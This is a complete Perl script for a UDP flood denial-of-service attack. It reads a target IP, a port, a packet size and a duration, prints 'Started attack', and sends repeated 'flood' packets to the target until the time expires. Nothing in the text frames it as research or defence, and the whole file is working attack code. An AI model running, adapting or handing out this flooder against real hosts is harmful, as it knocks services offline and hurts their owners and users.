#!/usr/bin/perl
use 5.010;
use Socket;

my $MAX_PORT = 65535;
my $MAX_PPS = 65000;
my $MAX_TIME = 4000;

my ($ip, $port, $pps, $time) = @ARGV;
my $end = time() + ($time ? $time : 100);

$targ = inet_aton("$ip") or die "Invalid IP address";
socket(flood, PF_INET, SOCK_DGRAM, 17);

if($ip != 0 && $port != 0 && $pps != 0 && $time != 0){
  if($pps <= $MAX_PPS && $time <= $MAX_TIME && $port <= $MAX_PORT){
    print("Started attack\n");
    for(;time() <= $end;)
    {
       send(flood, pack("a$pps","flood"), 0, pack_sockaddr_in($port, $targ));
    }
  }else{
    print("Check your args");
    return;
  }
}
else{
  print("Invalid args");
  return;
}
